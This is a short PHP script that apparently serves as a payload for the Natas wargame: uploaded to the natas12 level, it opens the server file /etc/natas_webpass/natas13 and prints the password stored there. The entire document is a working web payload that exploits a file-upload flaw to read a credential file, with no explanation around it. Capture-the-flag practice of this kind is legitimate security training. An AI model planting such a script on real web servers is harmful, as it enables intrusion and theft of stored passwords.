<?php  
$pass = fopen("/etc/natas_webpass/natas13","r");
echo fread($pass,filesize("/etc/natas_webpass/natas13"));
fclose($pass);
?>